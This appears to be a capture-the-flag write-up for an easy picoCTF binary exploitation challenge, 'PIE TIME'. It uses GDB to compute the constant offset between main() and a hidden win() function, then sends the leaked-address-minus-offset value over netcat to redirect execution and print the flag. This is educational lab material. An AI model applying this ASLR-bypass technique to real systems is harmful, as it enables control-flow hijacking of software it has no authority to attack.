# ğŸ¥§ PIE TIME -- CTF Write-Up

**Category:** Binary Exploitation\
**Difficulty:** Easy\
**Challenge Name:** PIE TIME\
**Description:**\
Can you try to get the flag? Beware we have PIE! Connect to the program
with netcat.

------------------------------------------------------------------------

## ğŸ“Œ Overview

This challenge demonstrates a basic exploitation technique against a PIE
(Position Independent Executable) binary.\
The goal is to bypass ASLR by calculating a constant offset between two
functions and redirect execution to a hidden `win()` function.

------------------------------------------------------------------------

# ğŸ§© Solution Walkthrough

------------------------------------------------------------------------

## ğŸ”¹ Step 1 -- Initial Files

We are provided with two files:

-   `vuln` â†’ ELF 64-bit LSB PIE executable (not stripped)
-   `vuln.c` â†’ Source code

The binary properties:

    ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

------------------------------------------------------------------------

## ğŸ”¹ Step 2 -- Running the Program

Make it executable:

``` bash
chmod +x vuln
```

Run it:

``` bash
./vuln
```

Output:

    Address of main: 0x556367b5c33d
    Enter the address to jump to, ex => 0x12345:

If we enter a random address:

    Segfault Occurred, incorrect address.

So the program takes user input as a memory address and jumps to it.

------------------------------------------------------------------------

## ğŸ”¹ Step 3 -- Source Code Analysis

From `vuln.c`, we observe:

``` c
void (*foo)(void) = (void (*)())val;
foo();
```

The program:

1.  Takes user input
2.  Interprets it as a function pointer
3.  Jumps to that address

There is a hidden function:

``` c
int win()
```

This function:

-   Prints "You won!"
-   Opens `flag.txt`
-   Prints the flag

The `win()` function is never called directly in `main()`.

Our objective: Redirect execution to `win()`.

------------------------------------------------------------------------

## ğŸ”¹ Step 4 -- Analyzing with GDB

Launch GDB:

``` bash
gdb vuln
```

Disassemble `win()`:

``` bash
disassemble win
```

Example address:

    0x00000000000012a7

Disassemble `main()`:

``` bash
disassemble main
```

Example address:

    0x000000000000133d

------------------------------------------------------------------------

## ğŸ”¹ Step 5 -- Understanding PIE & ASLR

Because the binary is PIE:

-   The base address changes each run (ASLR).
-   But the offset between functions remains constant.

------------------------------------------------------------------------

## ğŸ”¹ Step 6 -- Calculate the Offset

    main  = 0x133d
    win   = 0x12a7

Offset:

    0x133d - 0x12a7 = 0x96

Decimal:

    150

This offset is constant regardless of runtime base address.

------------------------------------------------------------------------

## ğŸ”¹ Step 7 -- Exploiting Remotely

Connect to the remote service:

``` bash
nc rescued-float.picoctf.net <port>
```

Example output:

    Address of main: 0x5b685f92033d
    Enter the address to jump to, ex => 0x12345:

We calculate:

    win_address = main_address - 0x96

Example:

    0x5b685f92033d - 0x96 = 0x5b685f9202a7

Enter:

    5b685f9202a7

------------------------------------------------------------------------

## ğŸ”¹ Step 8 -- Success

Program output:

    You won!
    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_redacted}

------------------------------------------------------------------------

# ğŸ Final Flag

    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_redacted}

------------------------------------------------------------------------

# ğŸ§  Key Concepts Learned

-   Function pointers
-   PIE (Position Independent Executables)
-   ASLR bypass via offset calculation
-   Static vs runtime addresses
-   Basic binary exploitation methodology
-   Using GDB for reverse engineering

------------------------------------------------------------------------

## ğŸ’¡ Takeaway

Even with PIE enabled, if a program leaks a function address,\
you can compute offsets to reach hidden functions and redirect execution
safely.

A clean example of how address leaks defeat ASLR when offsets remain
constant.
